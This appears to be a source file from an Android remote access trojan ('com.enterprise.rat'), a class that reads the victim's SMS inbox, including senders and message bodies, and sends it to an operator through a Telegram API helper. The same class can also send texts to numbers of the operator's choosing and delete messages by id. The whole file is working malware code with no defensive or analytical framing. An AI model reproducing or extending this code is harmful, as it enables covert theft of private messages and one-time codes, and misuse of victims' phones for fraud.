package com.enterprise.rat.commands;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.telephony.SmsManager;
import com.enterprise.rat.utils.TelegramApi;

public class SMSManager {
    private Context context;

    public SMSManager(Context context) { this.context = context; }

    public void sendSMSList(int limit) {
        StringBuilder sb = new StringBuilder("<b>📩 Last " + limit + " SMS:</b>\n\n");
        Cursor cursor = context.getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC");
        if (cursor != null && cursor.moveToFirst()) {
            int count = 0;
            do {
                String address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                sb.append("<b>From:</b> <code>").append(address).append("</code>\n").append(body).append("\n\n");
                count++;
            } while (cursor.moveToNext() && count < limit);
            cursor.close();
            TelegramApi.sendMessage(sb.toString().substring(0, Math.min(sb.length(), 3900)));
        } else TelegramApi.sendMessage("❌ No SMS");
    }

    public void sendSMS(String phone, String msg) {
        try {
            SmsManager.getDefault().sendTextMessage(phone, null, msg, null, null);
            TelegramApi.sendMessage("✅ SMS sent to " + phone);
        } catch (Exception e) { TelegramApi.sendMessage("❌ " + e.getMessage()); }
    }

    public void deleteSMS(String id) {
        int del = context.getContentResolver().delete(Uri.parse("content://sms/" + id), null, null);
        TelegramApi.sendMessage("✅ Deleted " + del + " SMS");
    }
}
